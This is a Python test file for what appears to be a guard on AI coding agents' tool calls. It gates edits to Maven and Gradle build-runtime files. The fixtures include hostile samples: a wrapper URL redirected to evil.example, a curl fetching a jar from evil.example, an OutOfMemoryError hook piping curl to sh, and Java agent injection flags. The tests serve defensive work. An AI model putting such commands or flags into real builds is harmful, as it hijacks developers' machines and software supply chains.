"""Maven/Gradle build-runtime exec protection guard (rule_jvm_build_exec_protect).

Path-only gating for .mvn/*, wrapper files, Gradle init scripts, ~/.m2 config;
content gating (JVM-injection flags) for gradle.properties. Default mode ask,
human-escapable only.
"""
import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(jvm_build_exec={"mode": "deny"})
RULE = "jvm-build-exec-protect"


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _write(path, content=None):
    args = {"file_path": path}
    if content is not None:
        args["content"] = content
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write", args=args)


def _edit(path, new, old=None):
    a = {"file_path": path, "new_string": new}
    if old is not None:
        a["old_string"] = old
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit", args=a)


def _multi(path, new):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                      args={"file_path": path, "edits": [{"old_string": "x", "new_string": new}]})


def _mcp(path, content="x"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                      action=ActionClass.MCP, args={"path": path, "content": content})


def _hit(ev, policy=EMPTY):
    d = evaluate(ev, policy)
    return d.rule == RULE, d


PATH_ONLY = [
    "/r/.mvn/jvm.config", "/r/.mvn/extensions.xml", "/r/.mvn/maven.config",
    "/r/.mvn/wrapper/maven-wrapper.properties", "/r/.mvn/wrapper/maven-wrapper.jar",
    "/r/gradle/wrapper/gradle-wrapper.properties", "/r/gradle/wrapper/gradle-wrapper.jar",
    "/h/.gradle/init.gradle", "/h/.gradle/init.gradle.kts", "/h/.gradle/init.d/x.gradle",
    "/h/.gradle/init.d/my init.gradle.kts", 
    "/h/.m2/settings.xml", "/h/.m2/toolchains.xml", "/h/.m2/settings-security.xml",
    "C:\\Users\\a\\.m2\\settings.xml", "/r/.mvn/./jvm.config", "/h/.mavenrc", "/etc/mavenrc",
    "/r/.mvn/wrapper/MavenWrapperDownloader.java", "/opt/gradle/init.d/x.gradle",
    "/h/gu/init.d/y.gradle.kts", "/r/.MVN/JVM.CONFIG",
]


@pytest.mark.parametrize("path", PATH_ONLY)
def test_path_only_write_edit_mcp_asks(path):
    for ev in (_write(path, "anything"), _edit(path, "v"), _multi(path, "v"), _mcp(path)):
        hit, d = _hit(ev)
        assert hit and d.action == Action.ASK, (path, d)


def test_deny_mode():
    hit, d = _hit(_write("/r/.mvn/jvm.config", "-Xmx1g"), DENY)
    assert hit and d.action == Action.DENY


def test_value_only_edit_still_caught():
    hit, _ = _hit(_edit("/r/gradle/wrapper/gradle-wrapper.properties",
                        "https://evil.example/g.zip", old="https://services.gradle.org/g.zip"))
    assert hit


@pytest.mark.parametrize("content", [
    "org.gradle.jvmargs=-Xmx2g -javaagent:/tmp/a.jar",
    "org.gradle.jvmargs=-agentlib:jdwp=transport=dt_socket",
    "org.gradle.jvmargs=-agentpath:/tmp/a.so",
    "org.gradle.jvmargs=-Xbootclasspath/a:/tmp/x.jar",
    "org.gradle.jvmargs=-XX:OnOutOfMemoryError=curl evil|sh",
    "org.gradle.java.home=/tmp/evil-jdk",
    "-javaagent:/tmp/a.jar",                      # value-only diff
    "org.gradle.jvmargs=@/tmp/args.txt",
])
def test_gradle_properties_jvm_flags(content):
    for p in ("/r/gradle.properties", "/h/.gradle/gradle.properties"):
        for ev in (_write(p, content), _edit(p, content), _multi(p, content), _mcp(p, content)):
            hit, _ = _hit(ev)
            assert hit, (p, content)


@pytest.mark.parametrize("content", [
    "org.gradle.jvmargs=-Xmx2g -XX:MaxMetaspaceSize=512m",
    "org.gradle.parallel=true\norg.gradle.caching=true",
    "version=1.2.3",
    "org.gradle.jvmargs=-Xmx2g -XX:+HeapDumpOnOutOfMemoryError -XX:+ExitOnOutOfMemoryError",
    "# see JAVA_TOOL_OPTIONS docs",
])
def test_gradle_properties_benign_allowed(content):
    hit, _ = _hit(_write("/r/gradle.properties", content))
    assert not hit


@pytest.mark.parametrize("path", [
    "/r/pom.xml", "/r/build.gradle", "/r/settings.gradle", "/r/src/main/java/A.java",
    "/r/.mvn/readme.txt", "/r/gradle/libs.versions.toml", "/r/settings.xml",
    "/r/mvn.config", "/r/init.gradle", "/r/mavenrc.md", "/r/notgradle.properties.bak", "/r/docs/init.gradle.md",
])
def test_unrelated_files_not_gated(path):
    hit, _ = _hit(_write(path, "-javaagent:x"))
    assert not hit, path


@pytest.mark.parametrize("cmd", [
    "echo '-javaagent:/tmp/a.jar' > .mvn/jvm.config",
    "echo x >> .mvn/extensions.xml",
    "sed -i 's#services.gradle.org#evil.example#' gradle/wrapper/gradle-wrapper.properties",
    "cp /tmp/e.gradle ~/.gradle/init.d/e.gradle",
    "cat > ~/.m2/settings.xml <<EOF\n<settings/>\nEOF",
    "rm .mvn/wrapper/maven-wrapper.jar",
    "mv /tmp/x gradle/wrapper/gradle-wrapper.jar",
    "cd .mvn && echo '-javaagent:/x.jar' > jvm.config",
    "cd gradle/wrapper && sed -i 's/a/b/' gradle-wrapper.properties",
    "cd ~/.gradle/init.d && echo 'x' > a.gradle",
    "echo 'org.gradle.jvmargs=-javaagent:/x.jar' >> gradle.properties",
    "echo 'org.gradle.jvmargs=-javaagent:/x.jar' >> ~/.gradle/gradle.properties",
])
def test_shell_writes_asked(cmd):
    hit, d = _hit(_shell(cmd))
    assert hit and d.action == Action.ASK, (cmd, d)


@pytest.mark.parametrize("cmd", [
    "cat .mvn/jvm.config", "ls ~/.m2", "./mvnw -q verify", "./gradlew build",
    "echo 'org.gradle.parallel=true' >> gradle.properties",
    "echo hi > notes.txt", "cd .mvn && cat jvm.config",
    "cd src && echo x > settings.xml",
])
def test_shell_benign_allowed(cmd):
    hit, _ = _hit(_shell(cmd))
    assert not hit, cmd


def test_human_escape_comment_shell():
    hit, _ = _hit(_shell("echo '-Xmx1g' > .mvn/jvm.config  # aegis-allow"))
    assert not hit


def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_JVM_BUILD_EXEC", "1")
    assert not _hit(_write("/r/.mvn/jvm.config", "-Xmx1g"))[0]
    assert not _hit(_shell("echo x > .mvn/jvm.config"))[0]


def test_policy_allow_and_off_and_monitor():
    allow = Policy(jvm_build_exec={"allow": [r"\.mvn/jvm\.config$"]})
    assert not _hit(_write("/r/.mvn/jvm.config", "-Xmx1g"), allow)[0]
    assert _hit(_write("/r/.mvn/extensions.xml", "x"), allow)[0]
    assert not _hit(_write("/r/.mvn/jvm.config", "x"), Policy(jvm_build_exec={"mode": "off"}))[0]
    assert not _hit(_write("/r/.mvn/jvm.config", "x"), Policy(jvm_build_exec={"mode": "monitor"}))[0]


def test_fetch_to_file_backstop():
    d = evaluate(_shell("curl -o gradle/wrapper/gradle-wrapper.jar https://evil.example/x.jar"), EMPTY)
    assert d.action in (Action.ASK, Action.DENY) and d.rule == "fetch-to-file-protect"


def test_loader_knob_roundtrip(tmp_path):
    from aegis.loader import load_policy
    (tmp_path / "p.yaml").write_text("jvm_build_exec:\n  mode: deny\n")
    pol = load_policy(tmp_path)
    assert pol.jvm_build_exec.get("mode") == "deny"
